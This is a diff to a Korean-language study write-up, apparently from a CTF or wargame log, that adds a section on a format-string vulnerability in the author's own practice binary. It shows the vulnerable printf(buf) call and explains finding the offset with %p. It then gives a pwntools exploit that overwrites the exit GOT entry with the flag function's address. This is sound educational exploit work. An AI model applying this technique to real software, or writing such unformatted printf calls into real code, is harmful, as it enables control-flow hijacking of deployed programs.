@@ -126,3 +126,54 @@ p.interactive()
 ## 마무리
  - 해당 취약점을 보며 전역변수에대한 개념과 음수대입 등 여러 취약점을 알게된것같다.
  - 문제를 만들며 해당취약점으로 rop문제를 하나 만들어 내보면 재밌을것같으니 만들어서 올려보겠습니다.
+
+# 🐣fsb🐣
+![js](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white) ![js](https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=white) ![js](https://img.shields.io/badge/Visual_Studio_Code-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white)
+## 개요
+ - 해당 취약점은 string type을 지정해주지않아 구조가 format 되지않아 발생하는 취약점 입니다.
+
+## 취약점
+ - 제가 작성한 코드에서의 취약점은 간단합니다.
+```
+print(buf)
+```
+ - 해당 코드로 인해 취약점이발생합니다. 포인터로 포맷을 지정하지않았고 사용자의 입력을받아 출력합니다.
+
+## 시나리오
+ - 먼저 취약점에 다가가기 전에 검증값이 있는것을 확인할수있습니다.
+```
+if(strcmp(arr[number-1],"admin")==0)
+{
+ printf(buf);
+ exit(0);
+}
+```
+ - create_dia 함수에서 만들어진 diary_name 값이 string(admin) 일경우 인것을 확인할수있습니다.
+ - 그다음 aaaa %p %p ..... 를 입력하여 버퍼주소의 offset을 확인합니다.
+ - 그후 버퍼를 실행하게하고 exit got주소를 flag주소로 덮어씌워 다음실행주소가 flag가 되게 설계합니다.
+
+## exploit
+```
+from pwn import *
+p = process('./fsb')
+e = ELF('./fsb')
+
+context.arch = 'amd64'
+
+exit = e.got['exit']
+flag = e.symbols['flag']
+
+p.sendlineafter(b'index :', b'1')
+p.sendlineafter(b'>>>',b'admin')
+
+p.sendlineafter(b'index :', b'2')
+p.sendlineafter(b'>>>',b'1')
+
+p.sendline(fmtstr_payload(10, {exit: flag}))
+
+p.interactive()
+```
+
+## 마무리
+ - 원래라면 fsb 자체가 조금더 복잡한문제였을텐데 pwntools에서 지원하는 fmtstr_payload 를 활용해 간단하게 풀수있는 문제였습니다.
+ - 감사합니다.
